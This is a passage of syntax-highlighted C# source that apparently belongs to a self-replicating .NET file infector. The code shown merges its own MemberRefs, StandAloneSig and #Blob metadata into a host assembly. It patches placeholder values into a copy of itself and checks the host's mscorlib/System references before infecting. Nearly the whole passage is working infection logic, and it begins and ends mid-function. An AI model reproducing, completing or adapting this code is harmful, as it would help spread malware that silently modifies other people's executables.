                                                </span><span class="sc1">/* copy up to end of host MemberRefs */</span><span class="sc0">

                                                </span><span class="sc11">Array</span><span class="sc10">.</span><span class="sc11">Copy</span><span class="sc10">(</span><span class="sc11">rootold</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">raw</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">rootnew</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">dataoff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">baseind</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">skip2</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">methods</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc4">14</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">skip3</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">memberrefs</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc4">6</span><span class="sc10">));</span><span class="sc0">
                                                </span><span class="sc11">raw</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">baseind</span><span class="sc10">;</span><span class="sc0">

                                                </span><span class="sc11">Int32</span><span class="sc0"> </span><span class="sc11">methodoff</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">dataoff</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">skip2</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">0x14</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">mrefoff</span><span class="sc10">;</span><span class="sc0">

                                                </span><span class="sc1">/* append our MemberRefs */</span><span class="sc0">

                                                </span><span class="sc1">/* variable 12: RVA of our MemberRefs
                                                   variable 13: size of our MemberRefs
                                                */</span><span class="sc0">

                                                </span><span class="sc11">Marshal</span><span class="sc10">.</span><span class="sc11">Copy</span><span class="sc10">(</span><span class="sc11">Marshal</span><span class="sc10">.</span><span class="sc11">ReadIntPtr</span><span class="sc10">(</span><span class="sc11">ourbase</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0x0c626772</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">rootnew</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">mrefoff</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">dataoff</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">baseind</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc4">0x0d626772</span><span class="sc10">);</span><span class="sc0">

                                                </span><span class="sc1">/* variable 14: previous host number of MemberRefs */</span><span class="sc0">

                                                </span><span class="sc11">Int32</span><span class="sc0"> </span><span class="sc11">mrefdelta</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">memberrefs</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">0x0e626772</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">;</span><span class="sc0">

                                                </span><span class="sc1">/* variable 15: RVA in our code of variable 14 */</span><span class="sc0">

                                                </span><span class="sc11">Marshal</span><span class="sc10">.</span><span class="sc11">WriteInt32</span><span class="sc10">(</span><span class="sc11">codecopy</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x0f626772</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">memberrefs</span><span class="sc10">);</span><span class="sc0">

                                                </span><span class="sc1">/* variable 16: previous host #Blob stream size */</span><span class="sc0">

                                                </span><span class="sc11">Int32</span><span class="sc0"> </span><span class="sc11">blobsize</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">blobdelta</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">blobsize</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">basearr</span><span class="sc10">[</span><span class="sc11">blobind</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">])</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">0x10626772</span><span class="sc10">;</span><span class="sc0">

                                                </span><span class="sc1">/* variable 17: RVA in our code of variable 16 */</span><span class="sc0">

                                                </span><span class="sc11">Marshal</span><span class="sc10">.</span><span class="sc11">WriteInt32</span><span class="sc10">(</span><span class="sc11">codecopy</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x11626772</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">blobsize</span><span class="sc10">);</span><span class="sc0">

                                                </span><span class="sc11">Byte</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">ourblob</span><span class="sc10">;</span><span class="sc0">
                                                </span><span class="sc11">Int32</span><span class="sc0">  </span><span class="sc11">blobbase</span><span class="sc10">;</span><span class="sc0">

                                                </span><span class="sc1">/* make local copy of our #Blob stream */</span><span class="sc0">

                                                </span><span class="sc1">/* variable 18: size of our #Blob stream
                                                   variable 19: RVA of our #Blob stream
                                                */</span><span class="sc0">

                                                </span><span class="sc11">Marshal</span><span class="sc10">.</span><span class="sc11">Copy</span><span class="sc10">(</span><span class="sc11">Marshal</span><span class="sc10">.</span><span class="sc11">ReadIntPtr</span><span class="sc10">(</span><span class="sc11">blobbase</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ourbase</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0x13626772</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">ourblob</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Byte</span><span class="sc10">[</span><span class="sc4">0x12626772</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x12626772</span><span class="sc10">);</span><span class="sc0">

                                                </span><span class="sc1">/* variable 20: previous host number of TypeRefs */</span><span class="sc0">

                                                </span><span class="sc11">Int32</span><span class="sc0"> </span><span class="sc11">trefdelta</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">typerefs</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">0x14626772</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">;</span><span class="sc0">

                                                </span><span class="sc1">/* variable 21: RVA in our code of variable 20 */</span><span class="sc0">

                                                </span><span class="sc11">Marshal</span><span class="sc10">.</span><span class="sc11">WriteInt32</span><span class="sc10">(</span><span class="sc11">codecopy</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x15626772</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">typerefs</span><span class="sc10">);</span><span class="sc0">

                                                </span><span class="sc11">Byte</span><span class="sc0"> </span><span class="sc11">opcode</span><span class="sc10">;</span><span class="sc0">

                                                </span><span class="sc1">/* fix up host Class coded index, Name string offset, Signature blob offset */</span><span class="sc0">

                                                </span><span class="sc1">/* variable 9: number of our MemberRefs */</span><span class="sc0">

                                                </span><span class="sc11">baseind</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x09626772</span><span class="sc10">;</span><span class="sc0">

                                                </span><span class="sc5">do</span><span class="sc0">
                                                </span><span class="sc10">{</span><span class="sc0">
                                                    </span><span class="sc1">/* Int64 class does not support &amp; operator
                                                       and not worth finding how to implement it
                                                       so we use two reads for the 48 bits that we need
                                                    */</span><span class="sc0">

                                                    </span><span class="sc11">Marshal</span><span class="sc10">.</span><span class="sc11">WriteInt16</span><span class="sc10">(</span><span class="sc11">rootnew</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">dataoff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Int16</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt16</span><span class="sc10">(</span><span class="sc11">rootnew</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">dataoff</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">mrefdelta</span><span class="sc10">));</span><span class="sc0">
                                                    </span><span class="sc11">rva</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt32</span><span class="sc10">(</span><span class="sc11">rootnew</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">dataoff</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">);</span><span class="sc0">
                                                    </span><span class="sc11">Marshal</span><span class="sc10">.</span><span class="sc11">WriteInt32</span><span class="sc10">(</span><span class="sc11">rootnew</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">dataoff</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Int32</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">(((</span><span class="sc11">rva</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">blobdelta</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc4">0x10</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc5">unchecked</span><span class="sc10">((</span><span class="sc11">Int32</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">0xffff0000</span><span class="sc10">)))</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">rva</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">stringsdelta</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0xffff</span><span class="sc10">)));</span><span class="sc0">

                                                    </span><span class="sc1">/* fix MemberRef token indexes */</span><span class="sc0">

                                                    </span><span class="sc1">/* variable 22: previous host #Blob stream size (duplicated variable)
                                                       duplicated variables (not constants) require unique declarations
                                                    */</span><span class="sc0">

                                                    </span><span class="sc11">bitmap</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ourblob</span><span class="sc10">[</span><span class="sc11">strbase</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rva</span><span class="sc0"> </span><span class="sc10">&gt;&gt;</span><span class="sc0"> </span><span class="sc4">0x10</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">0x16626772</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

                                                    </span><span class="sc1">/* variable 23: RVA in our code of variable 22 */</span><span class="sc0">

                                                    </span><span class="sc11">Marshal</span><span class="sc10">.</span><span class="sc11">WriteInt32</span><span class="sc10">(</span><span class="sc11">codecopy</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x17626772</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">blobsize</span><span class="sc10">);</span><span class="sc0">

                                                    </span><span class="sc11">strbase</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">;</span><span class="sc0">

                                                    </span><span class="sc5">do</span><span class="sc0">
                                                    </span><span class="sc10">{</span><span class="sc0">
                                                        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(((</span><span class="sc11">opcode</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ourblob</span><span class="sc10">[</span><span class="sc11">strbase</span><span class="sc10">])</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0x1d</span><span class="sc10">)</span><span class="sc0">
                                                         </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">UInt32</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">opcode</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">0x0f</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">)</span><span class="sc0">
                                                           </span><span class="sc10">)</span><span class="sc0">
                                                        </span><span class="sc10">{</span><span class="sc0">
                                                            </span><span class="sc10">++</span><span class="sc11">strbase</span><span class="sc10">;</span><span class="sc0">
                                                            </span><span class="sc10">--</span><span class="sc11">bitmap</span><span class="sc10">;</span><span class="sc0">

                                                            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">UInt32</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">opcode</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">0x11</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
                                                            </span><span class="sc10">{</span><span class="sc0">
                                                                </span><span class="sc11">ourblob</span><span class="sc10">[</span><span class="sc11">strbase</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Byte</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">trefdelta</span><span class="sc10">);</span><span class="sc0">
                                                            </span><span class="sc10">}</span><span class="sc0">
                                                        </span><span class="sc10">}</span><span class="sc0">

                                                        </span><span class="sc10">++</span><span class="sc11">strbase</span><span class="sc10">;</span><span class="sc0">
                                                    </span><span class="sc10">}</span><span class="sc0">
                                                    </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(--</span><span class="sc11">bitmap</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

                                                    </span><span class="sc11">dataoff</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">6</span><span class="sc10">;</span><span class="sc0">
                                                </span><span class="sc10">}</span><span class="sc0">
                                                </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(--</span><span class="sc11">baseind</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

                                                </span><span class="sc1">/* copy up to end of host StandAloneSigs */</span><span class="sc0">

                                                </span><span class="sc11">Array</span><span class="sc10">.</span><span class="sc11">Copy</span><span class="sc10">(</span><span class="sc11">rootold</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">raw</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">rootnew</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">dataoff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">baseind</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">skip4</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">standalonesigs</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">));</span><span class="sc0">
                                                </span><span class="sc11">raw</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">baseind</span><span class="sc10">;</span><span class="sc0">

                                                </span><span class="sc1">/* append our StandAloneSig */</span><span class="sc0">

                                                </span><span class="sc11">Int32</span><span class="sc0"> </span><span class="sc11">blobtotal</span><span class="sc10">;</span><span class="sc0">

                                                </span><span class="sc1">/* variable 18: size of our #Blob stream */</span><span class="sc0">

                                                </span><span class="sc11">Marshal</span><span class="sc10">.</span><span class="sc11">WriteInt16</span><span class="sc10">(</span><span class="sc11">rootnew</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">dataoff</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">baseind</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Int16</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">blobtotal</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">blobsize</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0x12626772</span><span class="sc10">));</span><span class="sc0">

                                                </span><span class="sc1">/* check AssemblyRef names
                                                   we require "mscorlib" and "System", case-sensitive, in that order
                                                   to remove the System dependency requires building strings dynamically
                                                   and using the GetMethod() method to load the System.dll at runtime
                                                */</span><span class="sc0">

                                                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt64</span><span class="sc10">(</span><span class="sc11">rootold</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">baseind</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">bitmap</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">basearr</span><span class="sc10">[</span><span class="sc11">stringsind</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">])</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt16</span><span class="sc10">(</span><span class="sc11">rootold</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">raw</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">skip5</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0x0e</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0x62696C726F63736D</span><span class="sc10">)</span><span class="sc0">
                                                 </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rootold</span><span class="sc10">[</span><span class="sc11">baseind</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
                                                 </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt32</span><span class="sc10">(</span><span class="sc11">rootold</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">baseind</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">bitmap</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt16</span><span class="sc10">(</span><span class="sc11">rootold</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">raw</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">skip5</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0x22</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0x74737953</span><span class="sc10">)</span><span class="sc0">
                                                 </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt32</span><span class="sc10">(</span><span class="sc11">rootold</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">baseind</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0x00ffffff</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0x00006D65</span><span class="sc10">)</span><span class="sc0">
                                                   </span><span class="sc10">)</span><span class="sc0">
                                                </span><span class="sc10">{</span><span class="sc0">
                                                    </span><span class="sc11">Int32</span><span class="sc0"> </span><span class="sc11">randsig</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">sigoff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">siglen</span><span class="sc10">;</span><span class="sc0">

                                                    </span><span class="sc1">/* choose random host StandAloneSig */</span><span class="sc0">

                                                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(((</span><span class="sc11">siglen</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">rootold</span><span class="sc10">[</span><span class="sc11">sigoff</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">basearr</span><span class="sc10">[</span><span class="sc11">blobind</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Int32</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt16</span><span class="sc10">(</span><span class="sc11">rootnew</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">baseind</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">dataoff</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">randsig</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Random</span><span class="sc10">((</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">DateTime</span><span class="sc10">.</span><span class="sc11">Now</span><span class="sc10">.</span><span class="sc11">Ticks</span><span class="sc10">))).</span><span class="sc11">Next</span><span class="sc10">(</span><span class="sc11">standalonesigs</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)))])</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0x80</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
                                                    </span><span class="sc10">{</span><span class="sc0">
                                                        </span><span class="sc11">siglen</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">siglen</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0x3f</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">rootold</span><span class="sc10">[++</span><span class="sc11">sigoff</span><span class="sc10">];</span><span class="sc0">
                                                    </span><span class="sc10">}</span><span class="sc0">

                                                    </span><span class="sc1">/* check that combined #Blob stream &lt; 64kb */</span><span class="sc0">

                                                    </span><span class="sc1">/* variable 24: size of our locals */</span><span class="sc0">

                                                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">blobtotal</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rva</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">siglen</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0x18626772</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc4">0xffff</span><span class="sc10">)</span><span class="sc0">
                                                    </span><span class="sc10">{</span><span class="sc0">
                                                        </span><span class="sc1">/* copy rest of host #~ stream */</span><span class="sc0">

                                                        </span><span class="sc11">Array</span><span class="sc10">.</span><span class="sc11">Copy</span><span class="sc10">(</span><span class="sc11">rootold</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">raw</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">rootnew</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">dataoff</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">baseind</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">basearr</span><span class="sc10">[</span><span class="sc11">schemaind</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">basearr</span><span class="sc10">[</span><span class="sc11">schemaind</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">raw</span><span class="sc10">);</span><span class="sc0">
                                                        </span><span class="sc11">dataoff</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">dataoff</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">baseind</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">5</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">4</span><span class="sc10">;</span><span class="sc0">

                                                        </span><span class="sc1">/* update host #Blob stream offset and size */</span><span class="sc0">

                                                        </span><span class="sc11">Array</span><span class="sc10">.</span><span class="sc11">Copy</span><span class="sc10">(</span><span class="sc11">rootold</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">basearr</span><span class="sc10">[</span><span class="sc11">blobind</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">rootnew</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">hdroff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x10</span><span class="sc10">);</span><span class="sc0">
                                                        </span><span class="sc11">Marshal</span><span class="sc10">.</span><span class="sc11">WriteInt64</span><span class="sc10">(</span><span class="sc11">rootnew</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">hdroff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">Int64</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">blobtotal</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">blobtotal</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">5</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">4</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc4">0x20</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">dataoff</span><span class="sc10">);</span><span class="sc0">
                                                        </span><span class="sc11">hdroff</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">0x10</span><span class="sc10">;</span><span class="sc0">

                                                        </span><span class="sc1">/* copy host #Blob stream */</span><span class="sc0">

                                                        </span><span class="sc11">Byte</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">blobnew</span><span class="sc10">;</span><span class="sc0">

                                                        </span><span class="sc11">Array</span><span class="sc10">.</span><span class="sc11">Copy</span><span class="sc10">(</span><span class="sc11">rootold</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">basearr</span><span class="sc10">[</span><span class="sc11">blobind</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">blobnew</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Byte</span><span class="sc10">[(</span><span class="sc11">UInt32</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">blobtotal</span><span class="sc10">)],</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strbase</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">basearr</span><span class="sc10">[</span><span class="sc11">blobind</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">]);</span><span class="sc0">

                                                        </span><span class="sc1">/* append our #Blob stream to host #Blob stream */</span><span class="sc0">

                                                        </span><span class="sc11">Int32</span><span class="sc0"> </span><span class="sc11">bloboff</span><span class="sc10">;</span><span class="sc0">

                                                        </span><span class="sc1">/* variable 18: size of our #Blob stream */</span><span class="sc0">

